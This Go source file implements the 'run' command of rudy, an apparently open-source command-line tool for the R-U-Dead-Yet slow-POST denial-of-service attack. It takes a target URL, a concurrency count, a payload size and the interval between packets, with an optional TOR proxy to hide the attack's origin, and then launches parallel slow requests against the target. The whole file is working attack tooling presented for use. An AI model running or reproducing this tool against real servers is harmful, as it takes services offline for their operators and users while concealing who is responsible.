package commands

import (
	"math"
	"strings"
	"sync"
	"time"

	"github.com/darkweak/rudy/logger"
	"github.com/darkweak/rudy/request"
	"github.com/dustin/go-humanize"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

var (
	concurrents int64
	filepath    string
	interval    time.Duration
	size        string
	tor         string
	headers     string
	method      string
	url         string
)

const defaultInterval = 10 * time.Second

// Run is the runtime.
type Run struct{}

// SetFlags set the available flags.
func (*Run) SetFlags(flags *pflag.FlagSet) {
	flags.Int64VarP(&concurrents, "concurrents", "c", 1, "Concurrent requests count.")
	flags.StringVarP(&filepath, "filepath", "f", "", "Filepath to the payload.")
	flags.DurationVarP(&interval, "interval", "i", defaultInterval, "Interval between packets.")
	// Default ~1MB
	flags.StringVarP(&size, "payload-size", "p", "1MB", "Random generated payload with the given size.")
	flags.StringVarP(&tor, "tor", "t", "", "TOR endpoint (either socks5://1.1.1.1:1234, or 1.1.1.1:1234).")
	flags.StringVarP(&url, "url", "u", "", "Target URL to send the attack to.")
	flags.StringVarP(&headers, "headers", "H", "", "HTTP headers in HEADER=VALUE format, separated by commas.")
	flags.StringVarP(&method, "method", "m", "POST", "HTTP method to use for the request.")
}

// GetRequiredFlags returns the server required flags.
func (*Run) GetRequiredFlags() []string {
	return []string{"url"}
}

// GetArgs return the args.
func (*Run) GetArgs() cobra.PositionalArgs {
	return nil
}

// GetDescription returns the command description.
func (*Run) GetDescription() string {
	return "Run the rudy attack"
}

// GetLongDescription returns the command long description.
func (*Run) GetLongDescription() string {
	return "Run the rudy attack on the target"
}

// Info returns the command name.
func (*Run) Info() string {
	return "run -u http://domain.com"
}

// Run executes the script associated to the command.
func (*Run) Run() RunCmd {
	return func(_ *cobra.Command, _ []string) {
		var waitgroup sync.WaitGroup

		isize, e := humanize.ParseBytes(size)
		if e != nil {
			panic(e)
		}

		waitgroup.Add(int(concurrents))

		parsedHeaders := parseHeaders(headers)
		requestMethod := strings.ToUpper(strings.TrimSpace(method))
		if requestMethod == "" {
			requestMethod = "POST"
		}

		for range concurrents {
			go func() {
				if isize > math.MaxInt64 {
					return
				}

				req := request.NewRequest(int64(isize), url, requestMethod, interval, parsedHeaders)
				if tor != "" {
					req.WithTor(tor)
				}

				if req.Send() == nil {
					logger.Logger.Sugar().Infof("Request successfully sent to %s", url)
				}

				waitgroup.Done()
			}()
		}

		waitgroup.Wait()
	}
}

func parseHeaders(raw string) map[string]string {
	if raw == "" {
		return nil
	}

	headersMap := make(map[string]string)

	entries := strings.Split(raw, ",")
	for _, entry := range entries {
		entry = strings.TrimSpace(entry)
		if entry == "" {
			continue
		}

		parts := strings.SplitN(entry, "=", 2)
		if len(parts) != 2 {
			panic("invalid header format: " + entry)
		}

		key := strings.TrimSpace(parts[0])
		value := strings.TrimSpace(parts[1])

		if key == "" {
			panic("header name cannot be empty")
		}

		headersMap[key] = value
	}

	return headersMap
}

func newRun() command {
	return &Run{}
}

var (
	_ command             = (*Run)(nil)
	_ commandInstanciator = newRun
)
